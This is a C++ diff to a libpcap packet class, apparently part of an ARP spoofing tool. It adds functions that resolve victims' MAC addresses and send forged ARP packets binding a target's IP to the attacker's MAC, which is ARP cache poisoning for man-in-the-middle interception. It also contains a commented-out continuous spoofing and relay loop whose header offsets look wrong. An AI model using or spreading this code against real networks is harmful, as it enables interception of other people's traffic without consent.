@@ -67,7 +67,6 @@ bool Packet::setMyInterfaceInfo(){
 }
 
 
-//Set Ethernet Header: srcMAC, dstMAC, Ethernet Type
 void Packet::setEthHeader(u_int8_t* srcMac, u_int8_t* dstMac, u_int16_t ethType){
     for (int i = 0; i < ETH_ADDR_LEN; i++){
         ethArpPacket.eth.srcMac[i] = srcMac[i];
@@ -77,7 +76,6 @@ void Packet::setEthHeader(u_int8_t* srcMac, u_int8_t* dstMac, u_int16_t ethType)
 }
 
 
-//Set ARP Header: srcMAC, srcIP, dstMAC, dstIP, opCode
 void Packet::setArpHeader(u_int8_t* srcMac, u_int32_t srcIp, u_int8_t* dstMac, u_int32_t dstIp, u_int16_t opCode){
     for (int i = 0; i < ETH_ADDR_LEN; i++){
         ethArpPacket.arp.srcMac[i] = srcMac[i];
@@ -87,6 +85,7 @@ void Packet::setArpHeader(u_int8_t* srcMac, u_int32_t srcIp, u_int8_t* dstMac, u
     ethArpPacket.arp.dstIp = dstIp;
     ethArpPacket.arp.op = htons(opCode);
 }
+
 
 void Packet::sendPacket(){
     int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethArpPacket), sizeof(ethArpHdr));
@@ -103,6 +102,10 @@ packetInfo Packet::captureNextPacket(){
 
 
 void Packet::resolveMacByIp(u_int32_t ip){
+    setEthHeader(interfaceMac, BROADCAST_MAC, ethHdr::ARP);
+    setArpHeader(interfaceMac, interfaceIp, NULL_MAC, ip, arpHdr::ArpRequest);
+    sendPacket();
+
     while (true){
         packetInfo capturedPacketInfo = captureNextPacket();
         if (capturedPacketInfo.status == 0) continue;
@@ -113,16 +116,69 @@ void Packet::resolveMacByIp(u_int32_t ip){
 
         ethArpHdr* capturedPacket = (ethArpHdr*)(capturedPacketInfo.packet);
         if (ntohs(capturedPacket->eth.ethType) == ethHdr::ARP && capturedPacket->arp.srcIp == ip){
-            for (int i = 0; i < ETH_ADDR_LEN; i++)  arpTable[ip][i] = capturedPacket->eth.srcMac[i];   // Potential issue point – check here
+            for (int i = 0; i < ETH_ADDR_LEN; i++) arpTable[ip][i] = capturedPacket->eth.srcMac[i];
             break;
         }
     }
 }
 
 
+void Packet::resolveMacByIpforSpoof(u_int32_t senderIp, u_int32_t targetIp){
+    resolveMacByIp(senderIp);
+    resolveMacByIp(targetIp);
+
+    SenderTargetPair pair;
+    pair.sender.ip = senderIp;
+    pair.target.ip = targetIp;
+    for (int i = 0; i < ETH_ADDR_LEN; i++){
+        pair.sender.mac[i] = arpTable[senderIp][i];
+        pair.target.mac[i] = arpTable[targetIp][i];
+    }
+    senderTargetTable.push_back(pair);
+}
+
+
+void Packet::sendSpoofedPacket(u_int32_t senderIp, u_int32_t targetIp, u_int16_t opCode){
+    setEthHeader(interfaceMac, arpTable[senderIp], ethHdr::ARP);
+    setArpHeader(interfaceMac, targetIp, arpTable[senderIp], senderIp, opCode);
+    sendPacket();
+}
+
+/*
+void Packet::continuousArpSpoofing(){
+    while(true) {
+        packetInfo capturedPacketInfo = captureNextPacket();
+        if (capturedPacketInfo.status == 0) continue;
+        if (capturedPacketInfo.status == PCAP_ERROR || capturedPacketInfo.status == PCAP_ERROR_BREAK) {
+            printf("pcap_next_ex return %d(%s)\n", capturedPacketInfo.status , pcap_geterr(pcap));
+            break;
+        }
+
+        ethHdr* ethHeader = (ethHdr*)(capturedPacketInfo.packet);
+        for (auto iter = senderTargetTable.begin(); iter != senderTargetTable.end(); iter++){
+            //When ARP packet
+            if (ethHeader->ethType == htons(ethHdr::ARP)){
+                arpHdr* arpHeader = (arpHdr*)(capturedPacketInfo.packet + ETH_ADDR_LEN);
+                if (arpHeader->srcIp == iter->sender.ip && arpHeader->dstIp == iter->target.ip){
+                    sendSpoofedPacket(arpHeader->srcIp, arpHeader->dstIp, arpHdr::ArpReply);
+                    break;
+                }
+            }
+            //When IPv4 packet -> Send Relay Packet
+            else if (ethHeader->ethType == htons(ethHdr::IPv4)){
+                ipv4Hdr* ipv4Header = (ipv4Hdr*)(capturedPacketInfo.packet + ETH_ADDR_LEN);
+                if (ipv4Header->srcIp == iter->sender.ip && ipv4Header->dstIp == iter->target.ip){
+                    //sethdr -> send
+                    break;
+                }
+            }
+        }
+    }
+}
+*/
+
 void Packet::closeLiveCapture(){
     pcap_close(pcap);
-    fprintf(stderr, "close\n");
 }
 
 
